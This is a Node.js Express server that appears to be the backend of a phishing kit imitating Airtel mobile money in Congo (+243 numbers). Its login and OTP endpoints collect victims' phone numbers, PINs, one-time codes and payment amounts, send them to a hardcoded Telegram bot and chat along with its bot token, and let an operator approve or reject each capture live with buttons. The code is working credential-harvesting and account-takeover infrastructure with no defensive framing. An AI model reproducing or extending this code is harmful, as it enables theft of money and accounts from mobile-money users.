const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 5000;

// 🔑 Your details
const BOT_TOKEN = process.env.BOT_TOKEN || "8979057744:AAEiWFpLicOu-cIEPP6Ol8EdQqJYC4BncV4";
const CHAT_ID   = process.env.CHAT_ID   || "8409068780";
const PUBLIC_URL = process.env.PUBLIC_URL || "https://aairtel-production.up.railway.app";

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// IN-MEMORY STORAGE
// ============================================================
const requests = {};
const TIMEOUT_MS = 30 * 60 * 1000; // 30 minutes

function newId() {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
}

function esc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function pruneExpired() {
  const now = Date.now();
  for (const id in requests) {
    if (requests[id].status === 'pending' && now - requests[id].createdAt > TIMEOUT_MS) {
      requests[id].status = 'expired';
    }
  }
}
setInterval(pruneExpired, 60 * 1000);

// ============================================================
// TELEGRAM HELPERS
// ============================================================
async function tgCall(method, body) {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const data = await res.json();
    if (!data.ok) console.error(`[TG ${method}] error:`, JSON.stringify(data));
    return data;
  } catch (err) {
    console.error(`[TG ${method}] fetch error:`, err.message);
    return { ok: false, error: err.message };
  }
}

async function sendMessage(text, replyMarkup) {
  return tgCall('sendMessage', {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    ...(replyMarkup ? { reply_markup: replyMarkup } : {})
  });
}

async function editMessage(messageId, text) {
  return tgCall('editMessageText', {
    chat_id: CHAT_ID,
    message_id: messageId,
    text,
    parse_mode: 'HTML',
    reply_markup: { inline_keyboard: [] }
  });
}

// ============================================================
// HEALTH
// ============================================================
app.get('/', (req, res) => {
  res.json({ status: 'ok', message: 'AAirtel backend running' });
});

app.get('/debug/requests', (req, res) => {
  res.json(requests);
});

// ============================================================
// LOGIN  →  send to Telegram with ✅ / ❌ buttons
// ============================================================
app.post('/api/login', async (req, res) => {
  try {
    const { phone, pin, amount, session } = req.body;

    if (!phone || !pin) {
      return res.status(400).json({ success: false, error: 'Missing phone or pin' });
    }

    const id = newId();

    const text =
      `🔑 <b>LOGIN ATTEMPT</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `<b>📱 Téléphone:</b> +243 ${esc(phone)}\n` +
      `<b>🔒 PIN:</b> <code>${esc(pin)}</code>\n` +
      `<b>💰 Montant:</b> $${esc(amount || 'N/A')}\n` +
      `<b>🆔 ID:</b> <code>${esc(id)}</code>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🕒 ${new Date().toLocaleString('fr-FR')}`;

    const reply_markup = {
      inline_keyboard: [[
        { text: '✅ Approuver', callback_data: `approve:${id}` },
        { text: '❌ Rejeter',   callback_data: `reject:${id}`  }
      ]]
    };

    const result = await sendMessage(text, reply_markup);
    const messageId = result?.result?.message_id;

    console.log(`[LOGIN] id=${id} msgId=${messageId} pin=${pin}`);

    requests[id] = {
      type: 'login',
      phone, pin, amount, session,
      status: 'pending',
      createdAt: Date.now(),
      messageId,
      originalText: text
    };

    res.json({ success: true, request_id: id });
  } catch (err) {
    console.error('LOGIN ERROR:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// ============================================================
// LOGIN STATUS
// ============================================================
app.get('/api/login/status/:id', (req, res) => {
  const r = requests[req.params.id];
  if (!r || r.type !== 'login') {
    return res.json({ status: 'rejected' });
  }
  pruneExpired();
  res.json({ status: r.status });
});

// ============================================================
// OTP  →  send to Telegram with ✅ / ❌ buttons
// ============================================================
app.post('/api/otp', async (req, res) => {
  try {
    const { phone, otp, amount, session } = req.body;

    if (!phone || !otp) {
      return res.status(400).json({ success: false, error: 'Missing phone or otp' });
    }

    const id = newId();

    const text =
      `🔐 <b>OTP SUBMITTED</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `<b>📱 Téléphone:</b> +243 ${esc(phone)}\n` +
      `<b>🔢 OTP:</b> <code>${esc(otp)}</code>\n` +
      `<b>💰 Montant:</b> $${esc(amount || 'N/A')}\n` +
      `<b>🆔 ID:</b> <code>${esc(id)}</code>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🕒 ${new Date().toLocaleString('fr-FR')}`;

    const reply_markup = {
      inline_keyboard: [[
        { text: '✅ Approuver', callback_data: `approve:${id}` },
        { text: '❌ Rejeter',   callback_data: `reject:${id}`  }
      ]]
    };

    const result = await sendMessage(text, reply_markup);
    const messageId = result?.result?.message_id;

    console.log(`[OTP] id=${id} msgId=${messageId} otp=${otp}`);

    requests[id] = {
      type: 'otp',
      phone, otp, amount, session,
      status: 'pending',
      createdAt: Date.now(),
      messageId,
      originalText: text
    };

    res.json({ success: true, request_id: id });
  } catch (err) {
    console.error('OTP ERROR:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// ============================================================
// OTP STATUS
// ============================================================
app.get('/api/otp/status/:id', (req, res) => {
  const r = requests[req.params.id];
  if (!r || r.type !== 'otp') {
    return res.json({ status: 'rejected' });
  }
  pruneExpired();
  res.json({ status: r.status });
});

// ============================================================
// TELEGRAM WEBHOOK  →  receives admin button taps
// ============================================================
app.post('/api/telegram/webhook', async (req, res) => {
  // Respond 200 immediately so Telegram doesn't retry
  res.sendStatus(200);

  try {
    const update = req.body;

    if (!update.callback_query) return;

    const cq = update.callback_query;
    const data = cq.data || '';
    const [action, id] = data.split(':');
    const r = requests[id];

    console.log(`[WEBHOOK] action=${action} id=${id} found=${!!r}`);

    // Remove loading spinner on the button
    await tgCall('answerCallbackQuery', { callback_query_id: cq.id });

    if (!r) {
      console.log('[WEBHOOK] request not found (server may have restarted)');
      return;
    }

    let newText = '';
    if (action === 'approve') {
      r.status = 'approved';
      newText =
        `✅ <b>APPROUVÉ / APPROVED</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n\n` +
        r.originalText;
    } else if (action === 'reject') {
      r.status = 'rejected';
      newText =
        `❌ <b>REJETÉ / REJECTED</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n\n` +
        r.originalText;
    } else {
      return;
    }

    // Edit the original message. If edit fails (message too old, etc), send new.
    const editResult = await editMessage(r.messageId, newText);
    if (!editResult.ok) {
      console.log('[WEBHOOK] edit failed, sending new message instead');
      await sendMessage(newText);
    } else {
      console.log(`[WEBHOOK] ${action} done for ${id}`);
    }
  } catch (err) {
    console.error('WEBHOOK ERROR:', err);
  }
});

// ============================================================
// SETUP  →  register webhook with Telegram (call once)
// ============================================================
app.get('/setup-webhook', async (req, res) => {
  const webhookUrl = `${PUBLIC_URL}/api/telegram/webhook`;
  const result = await tgCall('setWebhook', { url: webhookUrl });
  res.json(result);
});

// ============================================================
// 404 + START
// ============================================================
app.use((req, res) => {
  res.status(404).json({ success: false, error: 'Route not found' });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
